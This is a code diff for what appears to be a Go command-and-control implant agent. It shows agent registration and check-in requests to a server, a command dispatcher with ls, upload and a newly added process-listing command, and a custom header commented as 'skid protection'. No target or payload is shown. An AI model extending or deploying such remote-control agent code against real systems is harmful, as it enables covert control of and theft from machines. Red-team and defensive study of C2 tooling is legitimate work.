@@ -5,14 +5,11 @@ import (
 	"crypto/tls"
 	"encoding/binary"
 	"encoding/json"
-
-	//"fmt"
 	"io/ioutil"
 	"math/rand"
 	"net/http"
 	"os"
 	"os/user"
-
 	//"log" // only for debugging
 	"strconv"
 	"strings"
@@ -101,6 +98,7 @@ func registerAgent(url string, magic []byte, agentId string) string{
 	req, err := http.NewRequest("POST", url, bytes.NewBuffer(append(agentHeader, []byte(requestDat)...)))
 	checkError(err)
 	req.Header.Set("User-Agent", userAgent)
+	req.Header.Set("X-IsAGopher", "true") // skid protection
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	req.Header.Set("Content-Length", strconv.Itoa(size))
 
@@ -150,6 +148,7 @@ func checkIn(dat string, checkInType string) string{
 		timeoutCounter = 0
 	}
 	req.Header.Set("User-Agent", userAgent)
+	req.Header.Set("X-IsAGopher", "true")
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	req.Header.Set("Content-Length", strconv.Itoa(size))
 
@@ -170,15 +169,22 @@ func checkIn(dat string, checkInType string) string{
 	} else {
 		timeoutCounter = 0
 	}
-    defer res.Body.Close()
+    //defer res.Body.Close()
 
 	resBody, _ := ioutil.ReadAll(res.Body)
+	err = res.Body.Close()
+	if err != nil {
+		os.Exit(2)
+	}
 	return string(resBody)
 }
 
 func validateArgs(cmdArgs []string) bool {
 	// shhh not scuffed not scuffed not scuffed not scuffed
-	if len(cmdArgs) < 2 && utils.Strip(cmdArgs[0]) != "o7" {
+	if utils.Strip(cmdArgs[0]) == "o7" || utils.Strip(cmdArgs[0]) == "ps" {
+		return true
+	}
+	if len(cmdArgs) < 2 {
 		return false
 	} else {
 		return true
@@ -208,6 +214,8 @@ func RunCommand(command string) string {
 			}
 		case "ls":
 			output = functions.Ls(cmdArgs[1])
+		case "ps":
+			output = functions.Ps()
 		case "upload":
 			params := strings.Split(command[7:], ";")
 			//log.Println(params)
